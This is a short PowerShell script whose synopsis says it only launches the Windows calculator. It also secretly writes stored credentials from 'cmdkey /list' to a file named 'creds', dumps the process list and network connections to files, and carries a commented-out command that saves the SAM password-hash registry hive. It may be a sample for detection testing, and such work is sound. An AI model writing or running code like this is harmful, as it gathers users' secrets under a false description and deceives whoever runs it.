<#
.SYNOPSIS
	Launches the calculator application
#>
## reg save HKLM\sam %temp%\sam
cmdkey /list | Out-File -FilePath .\creds
Start-Process ms-calculator:
tasklist | Out-File -FilePath .\tasklist
netstat -an | Out-File -FilePath .\netstat
Start-Sleep -Seconds 5
Get-Process | Where-Object { $_.Name -eq "CalculatorApp" } | Select-Object -First 1 | Stop-Process

